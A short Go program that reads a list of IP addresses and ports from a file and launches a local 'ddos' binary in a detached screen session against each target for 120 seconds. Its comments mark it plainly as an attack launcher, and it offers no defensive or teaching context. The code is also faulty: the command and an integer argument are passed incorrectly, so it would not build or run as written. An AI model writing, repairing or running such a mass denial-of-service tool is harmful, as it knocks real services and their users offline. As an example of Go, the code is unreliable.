package main

import (
    "bufio"
    "fmt"
    "os"
    "os/exec"
    "strings"
)

func main() {
    file, err := os.Open("ips.txt")
    if err != nil {
        panic(err)
    }
    defer file.Close()
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        ipp := strings.Split(scanner.Text(), ":")
        ip := ipp[0]
        port := ipp[1]
        time := 120 // attack duration
        cmd := exec.Command("screen -dmS lol ./ddos", ip, port, time) // start the attack
        err := cmd.Run()
        if err != nil {
            fmt.Println(err)
        }
    }

    if err := scanner.Err(); err != nil {
        panic(err)
    }
}
